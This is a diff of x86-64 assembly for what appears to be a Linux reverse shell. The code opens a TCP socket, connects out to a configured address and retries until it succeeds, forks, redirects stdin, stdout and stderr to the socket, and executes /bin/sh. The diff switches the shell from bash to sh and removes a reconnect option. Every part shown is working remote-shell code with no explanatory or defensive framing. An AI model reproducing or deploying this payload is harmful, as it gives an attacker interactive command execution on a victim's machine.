@@ -5,10 +5,6 @@ struc sockaddr_in
     .sin_zero resb 8
 endstruc
 
-section .bss
-    pipefds:
-        resq 2
-
 section .rodata
     sockaddr istruc sockaddr_in
         at sockaddr_in.sin_family, dw 2         ; AF_INET
@@ -18,26 +14,19 @@ section .rodata
     iend
     sockaddr_in_size equ $ - sockaddr
 
-    bash db "/bin/bash", 0
-    reconnect db 0                              ; 0/1 (CHANGE_ME)
+    shell db "/bin/sh", 0
 
 section .text
     global _start
 
 _start:
-    xor rax, rax
-    xor rdi, rdi
-    xor rsi, rsi
-    xor rdx, rdx
-
     mov rax, 0x29                   ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
     mov rdi, 2                      ; AF_INET
     mov rsi, 1                      ; SOCK_STREAM
     mov rdx, 6                      ; IPPROTO_TCP
     syscall
 
-    mov rbx, rax
-    xor rax, rax
+    mov rbx, rax                    ; sock
 
 _connect:
     mov rax, 0x2A                   ; connect(sock, (sockaddr*)&sockaddr_in, sizeof(sockaddr_in))
@@ -46,11 +35,8 @@ _connect:
     mov rdx, sockaddr_in_size       ; sizeof(sockaddr_in)
     syscall
 
-    mov rdx, rax
-    movzx rcx, byte [reconnect]
-    and rdx, rcx
-    test rdx, rdx
-    jnz _connect
+    cmp rax, 0x00
+    jl _connect
 
     mov rax, 0x39                   ; fork()
     syscall
@@ -60,21 +46,21 @@ _connect:
 
     mov rax, 0x21                   ; dup2(oldfd, newfd)
     mov rdi, rbx                    ; sock
-    mov rsi, 0                      ; STDIN
+    xor rsi, rsi                    ; STDIN
     syscall
 
     mov rax, 0x21                   ; dup2(oldfd, newfd)
     mov rdi, rbx                    ; sock
-    mov rsi, 1                      ; STDOUT
+    mov rsi, 0x01                   ; STDOUT
     syscall
 
     mov rax, 0x21                   ; dup2(oldfd, newfd)
     mov rdi, rbx                    ; sock
-    mov rsi, 2                      ; STDERR
+    mov rsi, 0x02                   ; STDERR
     syscall
 
-    mov rax, 0x3B                   ; execve("/bin/bash", NULL, NULL)
-    lea rdi, [bash]                 ; "/bin/bash"
+    mov rax, 0x3B                   ; execve("/bin/sh", NULL, NULL)
+    lea rdi, [shell]                ; "/bin/sh"
     xor rsi, rsi                    ; NULL
     xor rdx, rdx                    ; NULL
     syscall
